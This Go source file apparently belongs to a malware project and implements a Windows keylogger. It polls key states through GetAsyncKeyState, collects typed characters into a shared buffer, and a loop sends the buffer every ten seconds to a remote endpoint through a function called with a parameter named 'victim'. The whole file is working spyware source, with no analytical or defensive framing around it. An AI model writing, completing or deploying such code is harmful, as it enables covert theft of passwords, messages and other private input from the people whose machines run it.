package services

import (
	"fmt"
	"github.com/TheTitanrain/w32"
	"main/network"
	"sync"
	"time"
)

var text = ""

type Keylogger struct {
	lastKey int
	Mutex   *sync.Mutex
	Channel chan struct{}
	saved   string
}

type Key struct {
	keyCode int
	changed bool
}

func (kl *Keylogger) Terminate() {
	close(kl.Channel)
	//
}

func (kl *Keylogger) GetKey() Key {
	activeKey := 0
	var keyState uint16

	for i := 32; i < 127; i++ {
		keyState = w32.GetAsyncKeyState(i)

		// Check if the most significant bit is set (key is down)
		if keyState&(1<<15) != 0 {
			activeKey = i
			break
		}
	}

	if activeKey != 0 {
		return Key{keyCode: activeKey, changed: true}

	} else {
		kl.lastKey = 0
	}

	return Key{keyCode: activeKey, changed: false}
}

func (kl *Keylogger) ParseKeycode(key int) string {
	return string(rune(key))
}

func (kl *Keylogger) Communicate(victim string) {
	for {
		select {
		case <-kl.Channel:
			kl.Channel = make(chan struct{})
			return
		default:
			time.Sleep(10 * time.Second)
			kl.Mutex.Lock()
			if text != "" {
				kl.saved += text
				text = ""
				kl.Mutex.Unlock()
			} else {
				kl.Mutex.Unlock()
				if kl.saved != "" {
					_, err := network.HandleTextRequest(kl.saved, "/", victim)
					if err != nil {
						fmt.Println("Error making the request")
					} else {
						kl.saved = ""
					}
				}
			}
		}
	}
}

func (kl *Keylogger) Start() {
	for {
		select {
		case <-kl.Channel:
			return
		default:

			pressed := kl.GetKey()
			time.Sleep(time.Millisecond * 20)
			let := kl.ParseKeycode(pressed.keyCode)
			if pressed.changed {
				kl.Mutex.Lock()
				if len(text) == 0 || let[0] != text[len(text)-1] {
					text += let
				}
				kl.Mutex.Unlock()
			}
		}
	}
}
